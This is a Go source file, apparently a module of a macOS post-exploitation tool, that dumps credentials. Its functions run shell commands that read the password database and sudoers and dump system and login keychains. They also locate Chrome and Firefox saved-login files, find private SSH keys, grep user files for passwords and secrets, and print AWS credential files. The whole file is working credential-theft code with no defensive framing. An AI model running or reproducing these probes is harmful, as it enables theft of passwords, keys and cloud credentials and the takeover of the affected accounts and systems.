package module

import (
	"fmt"
	"strings"
)

// RunCredentialShadow reads the system password database.
func RunCredentialShadow(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Master Password ==='",
		"cat /etc/master.passwd 2>/dev/null || echo 'no /etc/master.passwd'",
		"echo '---PASSWD---'; cat /etc/passwd 2>/dev/null",
		"echo '---SUDOERS---'; cat /private/etc/sudoers 2>/dev/null | head -50",
		"echo '=== Keychain ==='",
		"security dump-keychain -a /Library/Keychains/System.keychain 2>/dev/null | head -100 || echo 'keychain access denied (needs root)'",
		"security list-keychains 2>/dev/null",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialBrowsers extracts saved credentials from browsers.
func RunCredentialBrowsers(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Chrome ==='",
		"ls -la ~/Library/Application\\ Support/Google/Chrome/Default/Login* 2>/dev/null || echo 'no chrome logins'",
		"echo '=== Firefox ==='",
		"ls -la ~/Library/Application\\ Support/Firefox/Profiles/*.default/logins.json 2>/dev/null || echo 'no firefox logins'",
		"echo '=== Safari ==='",
		"security dump-keychain -a ~/Library/Keychains/login.keychain-db 2>/dev/null | grep -i 'acct\\|svce' | head -30 || echo 'no safari keys'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialSSHKeys discovers SSH keys.
func RunCredentialSSHKeys(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== SSH Keys ==='",
		"find /Users /root -name 'id_*' -not -name '*.pub' 2>/dev/null",
		"echo '---AUTHORIZED KEYS---'",
		"cat /Users/*/.ssh/authorized_keys 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null",
		"echo '---KNOWN HOSTS---'",
		"cat /Users/*/.ssh/known_hosts 2>/dev/null | head -20",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialConfigs scans for credentials in config files.
func RunCredentialConfigs(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== .env files ==='",
		"find /Users /etc -name '.env' 2>/dev/null | head -20",
		"echo '=== Config scans ==='",
		"grep -r -l 'password\\|secret' /Users --include='*.env' --include='*.json' --include='*.yml' --include='*.yaml' 2>/dev/null | grep -v node_modules | grep -v Library | head -20",
		"echo '=== AWS credentials ==='",
		"cat ~/.aws/credentials 2>/dev/null || echo 'no aws creds'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialAll runs all credential dumping probes.
func RunCredentialAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"SHADOW", RunCredentialShadow},
		{"BROWSERS", RunCredentialBrowsers},
		{"SSH_KEYS", RunCredentialSSHKeys},
		{"CONFIGS", RunCredentialConfigs},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
